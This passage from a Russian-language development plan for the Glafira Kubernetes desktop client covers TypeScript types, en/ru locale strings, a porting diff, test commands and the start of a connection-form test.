export type AuthMethod = AuthConfig["method"];

export type CaConfig = { mode: "system" } | { mode: "pem"; pem: string } | { mode: "insecure" };
export type CaMode = CaConfig["mode"];

export type ProxyConfig = { mode: "system" } | { mode: "none" } | { mode: "url"; url: string };
export type ProxyMode = ProxyConfig["mode"];

export interface ConnectionProfile {
  id: string;
  name: string;
  color: string;
  environment: Environment;
  readOnly: boolean;
  apiUrl: string;
  auth: AuthConfig;
  ca: CaConfig;
  tlsServerName?: string | null;
  proxy: ProxyConfig;
  favoriteNamespaces: string[];
  manualNamespaces: string[];
  requestTimeoutMs: number;
  connectTimeoutMs: number;
  /** Папка в дереве; null — корень. Меняется только командой перемещения. */
  folderId?: string | null;
  order?: number;
}

/** Секреты из формы: нет поля или null — оставить сохранённый, "" — удалить, иное — сохранить. */
export interface SecretsInput {
  token?: string | null;
  clientKey?: string | null;
}

export interface ConnectionFolder {
  id: string;
  name: string;
  parentId: string | null;
  order: number;
}

/** Итог экспорта подключений: сколько записано в файл. */
export interface ExportSummary {
  connections: number;
  folders: number;
}

/** Элемент предпросмотра импорта; `path` — имена папок от корня до места элемента. */
export interface PreviewItem {
  kind: "folder" | "connection";
  id: string;
  name: string;
  path: string[];
}

/** Подключение файла, которое не будет импортировано. */
export interface SkippedImport {
  name: string;
  reason: LocalizedText;
}

/** Предпросмотр (и итог) импорта подключений. */
export interface ImportPreview {
  added: PreviewItem[];
  updated: PreviewItem[];
  unchanged: PreviewItem[];
  skipped: SkippedImport[];
  warnings: LocalizedText[];
  /** Сколько новых подключений ждут токен или ключ. */
  needsSecrets: number;
}

/** Ссылка на элемент дерева подключений для перемещения. */
export interface TreeItemRef {
  kind: "folder" | "connection";
  id: string;
}

export type TestStepName = "config" | "tcp" | "exec" | "tls" | "auth" | "discovery" | "projects";

export interface TestStep {
  name: TestStepName;
  ok: boolean;
  message: LocalizedText;
  error?: AppError;
}

export interface TestReport {
  ok: boolean;
  steps: TestStep[];
}

export interface Capabilities {
  listProjects: boolean;
  listNodes: boolean;
  listAllPods: boolean;
  readClusterOperators: boolean;
  readClusterVersion: boolean;
}

export type PlatformKind = "openshift" | "kubernetes";
export type Distribution = "eks" | "gke" | "aks" | "rancher" | "deckhouse" | "k3s" | "rke2";

/** Платформа кластера (спец. §4.3); `label` — «OpenShift 4.18», «Kubernetes 1.31 (EKS)». */
export interface PlatformInfo {
  kind: PlatformKind;
  distribution: Distribution | null;
  version: string | null;
  label: string;
}

/** Группы API, от которых зависит, какие объекты показываются. */
export interface ApiGroups {
  routes: boolean;
  projects: boolean;
  deploymentConfigs: boolean;
  gatewayApi: boolean;
}

export interface ConnectionInfo {
  user: string;
  groups: string[];
  serverVersion: string;
  platform: PlatformInfo;
  apiGroups: ApiGroups;
  capabilities: Capabilities;
}

export type ImportAuth = "token" | "clientCert" | "browser" | "exec";

export interface KubeContext {
  name: string;
  cluster: string;
  server: string;
  user: string;
  namespace: string | null;
  auth: ImportAuth;
  insecure: boolean;
  current: boolean;
  /** Строка запуска exec-плагина (путь к команде найден) — её подтверждает человек. */
  exec: ExecAuth | null;
  /** Почему контекст нельзя импортировать; null — можно. */
  unsupported: LocalizedText | null;
  /** Подключение с тем же адресом и именем: импорт обновит его. */
  existingId: string | null;
}

export interface KubeconfigPreview {
  path: string;
  contexts: KubeContext[];
}

export interface PolicyStatus {
  managed: boolean;
  source: string | null;
  updatesEnabled: boolean;
  updateUrl: string | null;
  language: string | null;
  mcpEnabled: boolean;
  /** false — подключения без проверки TLS запрещены администратором. */
  allowInsecureTls: boolean;
  /** false — подключения с exec-плагином запрещены администратором. */
  allowExecAuth: boolean;
  errors: LocalizedText[];
}

export interface AppInfo {
  name: string;
  version: string;
  commit: string;
  os: string;
  arch: string;
  dataDir: string;
  logDir: string;
}

export type LanguageReason = "policy" | "user" | "system" | "default";

export interface LanguageSettings {
  system: string | null;
  systemMatch: string | null;
  chosen: string | null;
  policy: string | null;
  effective: string;
  reason: LanguageReason;
  languages: string[];
}
````

<!-- block: file t13-src-i18n-languages-ts step=13.3 path=src/i18n/languages.ts -->
````ts
/** Языки, для которых есть словарь `src/locales/<код>.json`. Остальные 10 языков добавляет этап O6. */
export type LanguageCode = "en" | "ru";

export const LANGUAGES: { code: LanguageCode; nativeName: string }[] = [
  { code: "en", nativeName: "English" },
  { code: "ru", nativeName: "Русский" },
];
````

<!-- block: patch t13-src step=13.3 -->
````diff
diff --git a/PORTED.md b/PORTED.md
--- a/PORTED.md
+++ b/PORTED.md
@@ -54,3 +54,33 @@
 | `src-tauri/src/storage/tree.rs` | `src-tauri/src/storage/tree.rs` | `8bbd0bd` | как есть |
 | `src-tauri/src/storage/exchange.rs` | `src-tauri/src/storage/exchange.rs` | `8bbd0bd` | адаптирован: формат glafira-kubernetes-connections, флаги секретов, запрет insecure политикой |
 | `src-tauri/src/commands/folders.rs` | `src-tauri/src/commands/folders.rs` | `8bbd0bd` | адаптирован: политика в импорте, без сессий Kafka |
+| `src/i18n/index.ts` | `src/i18n/index.ts` | `8bbd0bd` | как есть |
+| `src/i18n/text.ts` | `src/i18n/text.ts` | `8bbd0bd` | как есть |
+| `src/i18n/text.test.ts` | `src/i18n/text.test.ts` | `8bbd0bd` | как есть |
+| `src/i18n/locales.test.ts` | `src/i18n/locales.test.ts` | `8bbd0bd` | как есть |
+| `src/i18n/documentLang.test.ts` | `src/i18n/documentLang.test.ts` | `8bbd0bd` | как есть |
+| `src/lib/format.ts` | `src/lib/format.ts` | `8bbd0bd` | как есть |
+| `src/lib/format.test.ts` | `src/lib/format.test.ts` | `8bbd0bd` | как есть |
+| `src/lib/formatAgo.ts` | `src/lib/formatAgo.ts` | `8bbd0bd` | как есть |
+| `src/lib/focusTrap.ts` | `src/lib/focusTrap.ts` | `8bbd0bd` | как есть |
+| `src/lib/activate.ts` | `src/lib/activate.ts` | `8bbd0bd` | как есть |
+| `src/lib/activate.test.tsx` | `src/lib/activate.test.tsx` | `8bbd0bd` | как есть |
+| `src/lib/plainInputs.ts` | `src/lib/plainInputs.ts` | `8bbd0bd` | как есть |
+| `src/lib/plainInputs.test.ts` | `src/lib/plainInputs.test.ts` | `8bbd0bd` | как есть |
+| `src/lib/useDebouncedValue.ts` | `src/lib/useDebouncedValue.ts` | `8bbd0bd` | как есть |
+| `src/lib/useDebouncedValue.test.ts` | `src/lib/useDebouncedValue.test.ts` | `8bbd0bd` | как есть |
+| `src/lib/env.ts` | `src/lib/env.ts` | `8bbd0bd` | как есть |
+| `src/lib/useLanguageSync.ts` | `src/lib/useLanguageSync.ts` | `8bbd0bd` | как есть |
+| `src/test/render.tsx` | `src/test/render.tsx` | `8bbd0bd` | как есть |
+| `src/components/common/ErrorBanner.tsx` | `src/components/common/ErrorBanner.tsx` | `8bbd0bd` | как есть |
+| `src/components/common/ErrorBanner.test.tsx` | `src/components/common/ErrorBanner.test.tsx` | `8bbd0bd` | адаптирован: ключи и коды Kubernetes |
+| `src/components/common/Hint.tsx` | `src/components/common/Hint.tsx` | `8bbd0bd` | как есть |
+| `src/components/common/Hint.test.tsx` | `src/components/common/Hint.test.tsx` | `8bbd0bd` | как есть |
+| `src/components/common/EnvBadge.tsx` | `src/components/common/EnvBadge.tsx` | `8bbd0bd` | как есть |
+| `src/i18n/languages.ts` | `src/i18n/languages.ts` | `8bbd0bd` | адаптирован: языки en и ru |
+| `src/lib/links.ts` | `src/lib/links.ts` | `8bbd0bd` | адаптирован: адреса репозиториев |
+| `src/test/setup.ts` | `src/test/setup.ts` | `8bbd0bd` | как есть |
+| `src/api/client.ts` | `src/api/client.ts` | `8bbd0bd` | адаптирован: команды Kubernetes |
+| `src/api/types.ts` | `src/api/types.ts` | `8bbd0bd` | адаптирован: типы Kubernetes |
+| `scripts/i18n-check.mjs` | `scripts/i18n-check.mjs` | `8bbd0bd` | адаптирован: главы руководства O1 |
+| `scripts/i18n-check.test.mjs` | `scripts/i18n-check.test.mjs` | `8bbd0bd` | как есть |
diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -11,7 +11,8 @@
     "preview": "vite preview",
     "tauri": "tauri",
     "test": "vitest run",
-    "test:scripts": "node --test \"scripts/*.test.mjs\""
+    "test:scripts": "node --test \"scripts/*.test.mjs\"",
+    "i18n:check": "node scripts/i18n-check.mjs --rust-cyrillic src-tauri/src"
   },
   "dependencies": {
     "@floating-ui/react": "^0.27.20",
diff --git a/src/App.tsx b/src/App.tsx
--- a/src/App.tsx
+++ b/src/App.tsx
@@ -1,3 +1,22 @@
+import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
+import { useLanguageSync } from "./lib/useLanguageSync";
+
+function LanguageSync() {
+  useLanguageSync();
+  return null;
+}
+
+// Без автоповтора: backend сам ждёт до таймаута и быстро отказывает при недоступном кластере,
+// а повтор удваивал бы ожидание. Повторить можно кнопкой в баннере ошибки.
+const queryClient = new QueryClient({
+  defaultOptions: { queries: { retry: false, refetchOnWindowFocus: false } },
+});
+
 export default function App() {
-  return <main className="page">Glafira for Kubernetes</main>;
+  return (
+    <QueryClientProvider client={queryClient}>
+      <LanguageSync />
+      <main className="page">Glafira for Kubernetes</main>
+    </QueryClientProvider>
+  );
 }
diff --git a/src/main.tsx b/src/main.tsx
--- a/src/main.tsx
+++ b/src/main.tsx
@@ -1,8 +1,12 @@
 import "./polyfills";
+import "./i18n";
 import React from "react";
 import ReactDOM from "react-dom/client";
 import App from "./App";
 import "./styles.css";
+import { installPlainInputs } from "./lib/plainInputs";
+
+installPlainInputs();
 
 ReactDOM.createRoot(document.getElementById("root") as HTMLElement).render(
   <React.StrictMode>
diff --git a/src/test/setup.ts b/src/test/setup.ts
--- a/src/test/setup.ts
+++ b/src/test/setup.ts
@@ -1 +1,4 @@
 import "@testing-library/jest-dom/vitest";
+import { i18n } from "../i18n";
+
+await i18n.changeLanguage("ru");
````

<!-- block: locales t13-locales step=13.3 -->
````json
{
  "en": {
    "common": {
      "retry": "Retry",
      "cancel": "Cancel",
      "save": "Save",
      "delete": "Delete",
      "close": "Close",
      "loading": "Loading…",
      "details": "Details",
      "readOnly": "Read-only"
    },
    "errors": {
      "generic": "{{message}}",
      "internal": "Internal error",
      "io": "I/O error: {{error}}",
      "json": "JSON error: {{error}}",
      "app": {
        "taskPanicked": "Background task failed: {{error}}"
      },
      "storage": {
        "writeFailed": "Failed to write {{path}}: {{error}}",
        "newerSchema": "{{file}} was created by a newer version of the app (schemaVersion {{version}})",
        "quarantineFailed": "File {{path}} is corrupted ({{parseError}}) and a backup copy could not be saved: {{renameError}}"
      },
      "secrets": {
        "keychain": "Cannot access the system secret store",
        "readOnly": "OverlayStore is read-only"
      },
      "settings": {
        "unknownLanguage": "Unknown language “{{code}}”",
        "languageByPolicy": "The language is set by your organization"
      },
      "policy": {
        "invalidBool": "{{key}}: invalid boolean {{value}}",
        "invalidNumber": "{{key}}: invalid number {{value}}",
        "invalidString": "{{key}}: invalid string “{{value}}”",
        "invalidType": "{{key}}: invalid value of type {{kind}}",
        "unreadable": "Policy cannot be read: {{reason}}",
        "httpsRequired": "{{key}}: an https:// address is required — updates are not downloaded over http",
        "badLanguage": "{{key}}: unknown language “{{value}}”"
      },
      "connections": {
        "noId": "The connection has no ID",
        "emptyName": "Connection name cannot be empty",
        "notFound": "Connection {{id}} not found",
        "badApiUrl": "Invalid API server address “{{url}}”",
        "httpsRequired": "The API server address must start with https:// and contain a host",
        "certificatePemInvalid": "The client certificate must be in PEM format (-----BEGIN CERTIFICATE-----)",
        "caPemInvalid": "The CA certificate must be in PEM format (-----BEGIN CERTIFICATE-----)",
        "badProxyUrl": "Invalid proxy address “{{url}}”: use http://host:port",
        "badNamespace": "“{{name}}” is not a valid project name: use lowercase letters, digits and “-”",
        "timeoutTooSmall": "Timeouts must be at least 1000 ms",
        "loginRequired": "Sign in to the cluster: use “Sign in via browser”",
        "tokenMissing": "No token is saved for this connection — paste a token",
        "clientKeyMissing": "No client key is saved for this connection — add the key (PEM)",
        "insecureForbidden": "Connections without TLS certificate verification are forbidden by your organization",
        "execForbidden": "Connections with exec plugins are forbidden by your organization",
        "tokenNotUsed": "This connection does not sign in with a token"
      },
      "folders": {
        "notFound": "Folder {{id}} not found",
        "nameEmpty": "Enter a folder name",
        "nameTooLong": "The folder name is longer than 100 characters",
        "nameTaken": "A folder named “{{name}}” already exists here",
        "cycle": "A folder cannot be moved into itself or its subfolder",
        "notEmpty": "The folder is not empty: move or delete its connections and folders first"
      },
      "import": {
        "notGlafiraFile": "This is not a Glafira connections file",
        "invalidJson": "The file is damaged or is not JSON: {{error}}",
        "incompatibleVersion": "The file was created by an incompatible version of Glafira — update the app",
        "unsupportedConnection": "Not supported by this version of Glafira (update the app): {{error}}",
        "duplicateId": "Duplicate connection id in the file",
        "insecureForbidden": "Connections without TLS certificate verification are forbidden by your organization",
        "execForbidden": "Connections with exec plugins are forbidden by your organization"
      },
      "k8s": {
        "credentials": "The credentials of this connection cannot be used: {{message}}",
        "unexpectedResponse": "Unexpected response — is this the address of a Kubernetes API server?",
        "forbiddenIn": "Not allowed: {{verb}} {{resource}} in project “{{namespace}}”",
        "forbiddenCluster": "Not allowed: {{verb}} {{resource}} at the cluster level",
        "forbidden": "Not allowed: {{message}}",
        "unauthorized": "The cluster rejected the credentials: the token has expired or is invalid",
        "notFound": "Not found: {{message}}",
        "conflict": "The object has been changed by someone else: {{message}}",
        "invalid": "The cluster rejected the request: {{message}}",
        "tooManyRequests": "The API server is overloaded — try again later",
        "serverError": "The API server returned error {{code}}: {{message}}",
        "apiError": "API server error {{code}}: {{message}}",
        "hostnameMismatch": "The server certificate does not match its address — check the address or “TLS server name”",
        "certExpired": "The server certificate has expired or is not valid yet",
        "caUntrusted": "The server certificate is not signed by a trusted CA — specify the cluster CA",
        "tlsError": "TLS connection error",
        "dns": "Cannot resolve the server host name",
        "timeout": "The server did not respond in time",
        "connect": "Cannot connect to the server",
        "transport": "Network error: {{message}}"
      },
      "oauth": {
        "denied": "Sign-in was not completed: {{error}}",
        "stateMismatch": "The sign-in response does not match the request — try again",
        "timeout": "Sign-in in the browser was not completed in time",
        "cancelled": "Sign-in was cancelled",
        "notAvailable": "This cluster has no OpenShift OAuth server, so sign-in via browser is not available — use a token, a kubeconfig context or an exec plugin",
        "rejected": "The OAuth server rejected the sign-in: {{reason}}",
        "badTokenResponse": "The OAuth server returned an unexpected response",
        "browser": "Cannot open the browser: {{error}}"
      },
      "exec": {
        "commandMissing": "Specify the exec plugin command",
        "commandNotAbsolute": "Specify the full path to “{{command}}” — use “Find”",
        "commandNotFound": "Command “{{command}}” is not found in PATH or the standard folders — specify the full path",
        "notAllowed": "“{{command}}” is not in the list of allowed exec plugins",
        "argsNotAllowed": "The exec plugin “{{command}}” may run only as “{{expected}} …”",
        "badApiVersion": "Unsupported exec plugin API version “{{version}}”: use {{expected}}",
        "badEnvName": "Invalid environment variable name “{{name}}”",
        "notApproved": "Confirm the exec plugin launch line in the connection settings",
        "start": "Cannot start the exec plugin {{command}}: {{error}}",
        "timeout": "The exec plugin {{command}} did not finish in {{seconds}} s",
        "failed": "The exec plugin {{command}} failed (exit code {{code}})",
        "badOutput": "The exec plugin {{command}} returned no credentials"
      },
      "kubeconfig": {
        "unreadable": "Cannot read kubeconfig {{path}}: {{error}}",
        "execInteractive": "The exec plugin needs a terminal (interactiveMode: Always) — not supported",
        "execNotFound": "Command “{{command}}” is not found in PATH or the standard folders — install it or specify the full path in kubeconfig",
        "authProvider": "Authentication provider “{{name}}” is outdated and not supported — use an exec plugin",
        "noCluster": "The context refers to a missing cluster “{{name}}”",
        "fileUnreadable": "Cannot read {{path}} referenced by kubeconfig: {{error}}",
        "badBase64": "Certificate or key data in kubeconfig is not valid base64",
        "noContext": "Context “{{name}}” not found in kubeconfig",
        "noDefault": "Cannot find the default kubeconfig — choose a file"
      }
    },
    "messages": {
      "connectionTest": {
        "configOk": "Configuration is valid",
        "tcpOk": "TCP connection to {{address}} established",
        "tcpProxyOk": "TCP connection to the proxy {{address}} established",
        "execOk": "The exec plugin {{command}} returned credentials",
        "execOkUntil": "The exec plugin {{command}} returned credentials valid until {{expires}}",
        "tlsOk": "The server certificate is trusted",
        "tlsInsecure": "The server certificate is NOT verified (insecure mode)",
        "authOk": "Signed in as {{user}}",
        "discovery": "{{platform}} · API server {{version}}",
        "discoveryGroups": "{{platform}} · API server {{version}} · found: {{groups}}",
        "projectsOk": "Available projects: {{count}}",
        "projectsManual": "The cluster does not list projects for you; projects from the profile: {{count}}"
      }
    },
    "hints": {
      "label": "Hint: {{name}}"
    }
  },
  "ru": {
    "common": {
      "retry": "Повторить",
      "cancel": "Отмена",
      "save": "Сохранить",
      "delete": "Удалить",
      "close": "Закрыть",
      "loading": "Загрузка…",
      "details": "Подробности",
      "readOnly": "Только чтение"
    },
    "errors": {
      "generic": "{{message}}",
      "internal": "Внутренняя ошибка",
      "io": "Ошибка ввода-вывода: {{error}}",
      "json": "Ошибка JSON: {{error}}",
      "app": {
        "taskPanicked": "Фоновая задача завершилась аварийно: {{error}}"
      },
      "storage": {
        "writeFailed": "Не удалось записать {{path}}: {{error}}",
        "newerSchema": "{{file}} создан более новой версией приложения (schemaVersion {{version}})",
        "quarantineFailed": "Файл {{path}} повреждён ({{parseError}}), не удалось сохранить копию: {{renameError}}"
      },
      "secrets": {
        "keychain": "Ошибка доступа к системному хранилищу секретов",
        "readOnly": "OverlayStore только для чтения"
      },
      "settings": {
        "unknownLanguage": "Неизвестный язык «{{code}}»",
        "languageByPolicy": "Язык задан вашей организацией"
      },
      "policy": {
        "invalidBool": "{{key}}: недопустимое логическое {{value}}",
        "invalidNumber": "{{key}}: недопустимое число {{value}}",
        "invalidString": "{{key}}: недопустимая строка «{{value}}»",
        "invalidType": "{{key}}: недопустимое значение типа {{kind}}",
        "unreadable": "Политика не читается: {{reason}}",
        "httpsRequired": "{{key}}: нужен адрес https:// — обновления по http не загружаются",
        "badLanguage": "{{key}}: неизвестный язык «{{value}}»"
      },
      "connections": {
        "noId": "У подключения нет идентификатора",
        "emptyName": "Имя подключения не может быть пустым",
        "notFound": "Подключение {{id}} не найдено",
        "badApiUrl": "Неверный адрес API-сервера «{{url}}»",
        "httpsRequired": "Адрес API-сервера должен начинаться с https:// и содержать хост",
        "certificatePemInvalid": "Клиентский сертификат должен быть в формате PEM (-----BEGIN CERTIFICATE-----)",
        "caPemInvalid": "Сертификат CA должен быть в формате PEM (-----BEGIN CERTIFICATE-----)",
        "badProxyUrl": "Неверный адрес прокси «{{url}}»: укажите http://хост:порт",
        "badNamespace": "«{{name}}» — недопустимое имя проекта: строчные латинские буквы, цифры и «-»",
        "timeoutTooSmall": "Таймауты должны быть не меньше 1000 мс",
        "loginRequired": "Войдите в кластер: кнопка «Войти через браузер»",
        "tokenMissing": "Для подключения не сохранён токен — вставьте токен",
        "clientKeyMissing": "Для подключения не сохранён ключ клиентского сертификата — добавьте ключ (PEM)",
        "insecureForbidden": "Подключения без проверки TLS-сертификата запрещены вашей организацией",
        "execForbidden": "Подключения с exec-плагином запрещены вашей организацией",
        "tokenNotUsed": "Это подключение входит не по токену"
      },
      "folders": {
        "notFound": "Папка {{id}} не найдена",
        "nameEmpty": "Укажите имя папки",
        "nameTooLong": "Имя папки длиннее 100 символов",
        "nameTaken": "Папка «{{name}}» здесь уже есть",
        "cycle": "Папку нельзя переместить в неё саму или во вложенную папку",
        "notEmpty": "Папка не пуста: сначала перенесите или удалите её подключения и папки"
      },
      "import": {
        "notGlafiraFile": "Это не файл подключений Glafira",
        "invalidJson": "Файл повреждён или это не JSON: {{error}}",
        "incompatibleVersion": "Файл создан в несовместимой версии Glafira — обновите приложение",
        "unsupportedConnection": "Не поддерживается этой версией Glafira (обновите приложение): {{error}}",
        "duplicateId": "Повторяющийся id подключения в файле",
        "insecureForbidden": "Подключения без проверки TLS-сертификата запрещены вашей организацией",
        "execForbidden": "Подключения с exec-плагином запрещены вашей организацией"
      },
      "k8s": {
        "credentials": "Учётные данные подключения не подходят: {{message}}",
        "unexpectedResponse": "Неожиданный ответ — это точно адрес API-сервера Kubernetes?",
        "forbiddenIn": "Нет прав: {{verb}} {{resource}} в проекте «{{namespace}}»",
        "forbiddenCluster": "Нет прав: {{verb}} {{resource}} на уровне кластера",
        "forbidden": "Нет прав: {{message}}",
        "unauthorized": "Кластер отклонил учётные данные: токен истёк или неверен",
        "notFound": "Не найдено: {{message}}",
        "conflict": "Объект уже изменил кто-то другой: {{message}}",
        "invalid": "Кластер отклонил запрос: {{message}}",
        "tooManyRequests": "API-сервер перегружен — повторите позже",
        "serverError": "API-сервер вернул ошибку {{code}}: {{message}}",
        "apiError": "Ошибка API-сервера {{code}}: {{message}}",
        "hostnameMismatch": "Сертификат сервера не соответствует его адресу — проверьте адрес или «Имя для проверки TLS»",
        "certExpired": "Срок действия сертификата сервера истёк или ещё не начался",
        "caUntrusted": "Сертификат сервера подписан недоверенным CA — укажите CA кластера",
        "tlsError": "Ошибка TLS-соединения",
        "dns": "Не удаётся разрешить имя хоста сервера",
        "timeout": "Сервер не ответил вовремя",
        "connect": "Не удаётся подключиться к серверу",
        "transport": "Сетевая ошибка: {{message}}"
      },
      "oauth": {
        "denied": "Вход не выполнен: {{error}}",
        "stateMismatch": "Ответ входа не соответствует запросу — попробуйте ещё раз",
        "timeout": "Вход в браузере не завершён вовремя",
        "cancelled": "Вход отменён",
        "notAvailable": "На кластере нет OAuth-сервера OpenShift, поэтому вход через браузер недоступен — используйте токен, контекст kubeconfig или exec-плагин",
        "rejected": "OAuth-сервер отклонил вход: {{reason}}",
        "badTokenResponse": "OAuth-сервер вернул неожиданный ответ",
        "browser": "Не удалось открыть браузер: {{error}}"
      },
      "exec": {
        "commandMissing": "Укажите команду exec-плагина",
        "commandNotAbsolute": "Укажите полный путь к «{{command}}» — кнопка «Найти»",
        "commandNotFound": "Команда «{{command}}» не найдена в PATH и стандартных каталогах — укажите полный путь",
        "notAllowed": "«{{command}}» нет в списке разрешённых exec-плагинов",
        "argsNotAllowed": "Exec-плагин «{{command}}» можно запускать только как «{{expected}} …»",
        "badApiVersion": "Неподдерживаемая версия API exec-плагина «{{version}}»: нужна {{expected}}",
        "badEnvName": "Недопустимое имя переменной окружения «{{name}}»",
        "notApproved": "Подтвердите строку запуска exec-плагина в настройках подключения",
        "start": "Не удалось запустить exec-плагин {{command}}: {{error}}",
        "timeout": "Exec-плагин {{command}} не завершился за {{seconds}} с",
        "failed": "Exec-плагин {{command}} завершился с ошибкой (код выхода {{code}})",
        "badOutput": "Exec-плагин {{command}} не выдал учётных данных"
      },
      "kubeconfig": {
        "unreadable": "Не удалось прочитать kubeconfig {{path}}: {{error}}",
        "execInteractive": "Exec-плагину нужен терминал (interactiveMode: Always) — не поддерживается",
        "execNotFound": "Команда «{{command}}» не найдена в PATH и стандартных каталогах — установите её или укажите полный путь в kubeconfig",
        "authProvider": "Провайдер аутентификации «{{name}}» устарел и не поддерживается — используйте exec-плагин",
        "noCluster": "Контекст ссылается на отсутствующий кластер «{{name}}»",
        "fileUnreadable": "Не удалось прочитать {{path}} из kubeconfig: {{error}}",
        "badBase64": "Данные сертификата или ключа в kubeconfig — не base64",
        "noContext": "Контекст «{{name}}» не найден в kubeconfig",
        "noDefault": "Kubeconfig по умолчанию не найден — выберите файл"
      }
    },
    "messages": {
      "connectionTest": {
        "configOk": "Конфигурация корректна",
        "tcpOk": "TCP-соединение с {{address}} установлено",
        "tcpProxyOk": "TCP-соединение с прокси {{address}} установлено",
        "execOk": "Exec-плагин {{command}} выдал учётные данные",
        "execOkUntil": "Exec-плагин {{command}} выдал учётные данные до {{expires}}",
        "tlsOk": "Сертификат сервера доверенный",
        "tlsInsecure": "Сертификат сервера НЕ проверяется (небезопасный режим)",
        "authOk": "Вход выполнен: {{user}}",
        "discovery": "{{platform}} · API-сервер {{version}}",
        "discoveryGroups": "{{platform}} · API-сервер {{version}} · найдены: {{groups}}",
        "projectsOk": "Доступных проектов: {{count}}",
        "projectsManual": "Кластер не отдаёт вам список проектов; проектов в профиле: {{count}}"
      }
    },
    "hints": {
      "label": "Подсказка: {{name}}"
    }
  }
}
````

Применить: `python3 /tmp/o1a-blocks.py step 13.3`.

- [ ] **Step 4: Проверки.**

Run: `pnpm test`  
Expected: PASS — `Test Files 11 passed`, `Tests 37 passed`

Run: `pnpm exec tsc --noEmit`  
Expected: PASS — без ошибок

Run: `pnpm i18n:check`  
Expected: PASS — `✓ словари en, ru согласованы, вызовов из Rust: 126`

Run: `pnpm test:scripts`  
Expected: PASS — `# pass 45`, `# fail 0`

Run: `pnpm build`  
Expected: PASS — `✓ dist/assets: чанки совместимы с WebKit macOS 11+`

- [ ] **Step 5: Commit.**

```bash
git add -A
git commit -s -m "feat(ui): основа фронтенда — i18n (en, ru), словари, API-клиент, общие компоненты, i18n-check" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

### Task 14: Форма подключения

**Files:**
- Port: `src/components/connections/ConnectionFormTab.tsx`, `src/components/connections/tree/folderTree.test.ts`, `src/components/connections/tree/folderTree.ts`
- Create: `src/components/connections/ConnectionForm.test.tsx`, `src/components/connections/ConnectionForm.tsx`, `src/components/connections/exec.test.ts`, `src/components/connections/exec.ts`, `src/components/connections/profile.test.ts`, `src/components/connections/profile.ts`, `src/state/workspace.test.ts`, `src/state/workspace.ts`
- Modify: `PORTED.md`, `docs/i18n/same-as-en.json`, `src/locales/en.json`, `src/locales/ru.json`

**Interfaces:**
- Consumes: задача 13.
- Produces: `state/workspace.ts` — `TabSpec` (виды `cluster`, `connection-form`, `about`, `help`, `settings`), `tabId`, `useWorkspace` (`open`, `close`, `closeForConnection`, `activate`); `components/connections/profile.ts` — `newProfile`, `withAuthMethod(auth, method, lastCertificate, lastExec)`, `withCaMode`, `withProxyMode`, `parseNamespaces`, `formatNamespaces`; `components/connections/exec.ts` — `newExec`, `parseArgs`, `formatArgs`, `parseEnv`, `formatEnv`, `isSecretName`, `launchLine(ExecAuth)`, `needsExecConfirmation(initial, current)`; `ConnectionForm({ initial, tabId })`, `ConnectionFormTab({ connectionId, folderId, tabId })`; `tree/folderTree.ts` (`buildTree`, `filterTree`, `folderPaths`, `canMoveFolder`).

Спец. §5.1–5.2. Форма по образцу Kafka-версии: имя, папка, окружение (новое `prod` — только чтение), цвет, адрес API, способ входа (браузер / токен / сертификат / exec-плагин), CA (системный / PEM / без проверки — с предупреждением; вариант недоступен, если его запрещает политика), имя для проверки TLS, прокси, избранные и ручные проекты, таймауты, подсказки «?». У exec-плагина — команда с кнопкой «Найти» (полный путь по PATH оболочки входа), аргументы и переменные по строке, строка запуска со скрытыми значениями секретных переменных и галочка «Разрешаю Glafira запускать эту команду» — без неё у новой или изменённой строки «Проверить подключение» неактивна; во время проверки с плагином — «Отменить». Помощники exec-плагина — `components/connections/exec.ts`. Секреты уходят отдельно: пустое поле существующего подключения — «оставить сохранённый». После сохранения открывается вкладка подключения. Вкладки O1a — `cluster` (обзор подключения), `connection-form`, `settings`, `help`, `about`.

- [ ] **Step 1: Перенос из Kafka-версии.**

Файлы копируются с коммита `8bbd0bd` и правятся патчами (правки — против перенесённого файла).

<!-- block: shell t14-port step=14.1 -->
````bash
scripts/port.sh src/components/connections/ConnectionFormTab.tsx src/components/connections/ConnectionFormTab.tsx
scripts/port.sh src/components/connections/tree/folderTree.test.ts src/components/connections/tree/folderTree.test.ts
scripts/port.sh src/components/connections/tree/folderTree.ts src/components/connections/tree/folderTree.ts
````

Применить: `python3 /tmp/o1a-blocks.py step 14.1`.

- [ ] **Step 2: Тесты.**

<!-- block: file t14-src-components-connections-connectionform-test-tsx step=14.2 path=src/components/connections/ConnectionForm.test.tsx -->
````tsx
import { screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { renderWithClient } from "../../test/render";

vi.mock("../../api/client", async (importOriginal) => {
  const orig = await importOriginal<typeof import("../../api/client")>();
  return {
    ...orig,
    api: {
      testConnection: vi.fn(),
      saveConnection: vi.fn(),
      deleteConnection: vi.fn(),
      listConnections: vi.fn().mockResolvedValue([]),
      listFolders: vi.fn().mockResolvedValue([]),
      moveItems: vi.fn(),
      getPolicyStatus: vi.fn(),
      resolveExecCommand: vi.fn(),
      cancelOauthLogin: vi.fn(),
    },
  };
});

import { api } from "../../api/client";
import type { ConnectionProfile, PolicyStatus } from "../../api/types";
import { useWorkspace } from "../../state/workspace";
import { ConnectionForm } from "./ConnectionForm";
import { newProfile } from "./profile";

const POLICY: PolicyStatus = {
  managed: false,
  source: null,
  updatesEnabled: true,
  updateUrl: null,
  language: null,
  mcpEnabled: true,
  allowInsecureTls: true,
  allowExecAuth: true,
  errors: [],
};

const msg = (key: string, text: string, params: Record<string, string> = {}) => ({ key, params, text });

beforeEach(() => {
  vi.clearAllMocks();
  vi.mocked(api.listFolders).mockResolvedValue([]);
  vi.mocked(api.getPolicyStatus).mockResolvedValue(POLICY);
  useWorkspace.setState({ tabs: [], activeId: null });
});

describe("ConnectionForm", () => {
  it("проверяет подключение по токену и показывает шаги", async () => {
    vi.mocked(api.testConnection).mockResolvedValue({
      ok: false,
      steps: [
        { name: "config", ok: true, message: msg("messages.connectionTest.configOk", "Configuration is valid") },
        { name: "tcp", ok: true, message: msg("messages.connectionTest.tcpOk", "TCP", { address: "10.0.0.1:6443" }) },
        { name: "tls", ok: true, message: msg("messages.connectionTest.tlsOk", "trusted") },
        {
          name: "auth",
          ok: false,
          message: msg("errors.k8s.unauthorized", "rejected"),
          error: { code: "SESSION_EXPIRED", key: "errors.k8s.unauthorized", message: "rejected", details: "401 Unauthorized", retryable: false },
        },
      ],
    });
